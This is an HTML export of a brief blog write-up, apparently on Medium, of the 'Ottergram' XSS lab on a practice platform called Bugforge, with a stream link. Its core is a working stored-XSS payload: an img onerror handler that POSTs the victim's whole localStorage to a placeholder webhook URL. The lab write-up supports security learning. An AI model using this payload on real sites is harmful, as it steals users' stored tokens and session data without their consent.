@@ -1,0 +1,69 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Ottergram (XSS) Bugforge (Live Stream)</title><style>
+      * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      </style></head><body><article class="h-entry">
+<header>
+<h1 class="p-name">Ottergram (XSS) Bugforge (Live Stream)</h1>
+</header>
+<section data-field="body" class="e-content">
+<section name="e238" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="c301" id="c301" class="graf graf--h3 graf--leading graf--title">Ottergram (XSS) Bugforge</h3><p name="fbf6" id="fbf6" class="graf graf--p graf-after--h3">This was originally streamed live. This stream was to show you basically what I did to solve this one. Ignore the match &amp; replace — I was toying with it prior to the lab and *thought* I had it working, but getting it to work in the lab with react was tricky and 100x easier to edit the request in burp after intercepting.. anyway, this was my solution.</p><p name="28bb" id="28bb" class="graf graf--p graf-after--p"><a href="https://www.youtube.com/live/R-OsjlGliuM?si=y5B5iGehTcX5krid" data-href="https://www.youtube.com/live/R-OsjlGliuM?si=y5B5iGehTcX5krid" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">https://www.youtube.com/live/R-OsjlGliuM?si=y5B5iGehTcX5krid</a></p><p name="fe29" id="fe29" class="graf graf--p graf-after--p">Working payload:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="json" name="cfc2" id="cfc2" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;recipient_id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&lt;img src=x onerror=fetch(&#x27;INSERT-WEBHOOK-URL-HERE&#x27;,{method:&#x27;POST&#x27;,mode:&#x27;no-cors&#x27;,body:JSON.stringify(Object.fromEntries(Object.entries(localStorage)))})&gt;&quot;</span><span class="hljs-punctuation">}</span></span></pre><p name="b4a4" id="b4a4" class="graf graf--p graf-after--pre">As always, please this is for ethical use only where you’re testing with permission. I am not responsible for any actions you take.</p><p name="5f04" id="5f04" class="graf graf--p graf-after--p">Thanks for watching.</p><p name="6ce0" id="6ce0" class="graf graf--p graf-after--p graf--trailing">🍺 Quick message to readers: if my writeups help you, please consider a small donation to my buymeacoffee link <a href="http://buymeacoffee.com/7s26simon" data-href="http://buymeacoffee.com/7s26simon" class="markup--anchor markup--p-anchor" rel="noopener ugc nofollow noopener" target="_blank">here</a>. This is not required but is very much appreciated! 🍺</p></div></div></section>
+</section>
+<footer><p>By <a href="https://medium.com/@7s26simon" class="p-author h-card">7s26Simon</a> on <a href="https://medium.com/p/7983f06fdb6c"><time class="dt-published" datetime="2026-03-28T23:32:30.068Z">March 28, 2026</time></a>.</p><p><a href="https://medium.com/@7s26simon/ottergram-xss-bugforge-live-stream-7983f06fdb6c" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on June 13, 2026.</p></footer></article></body></html>
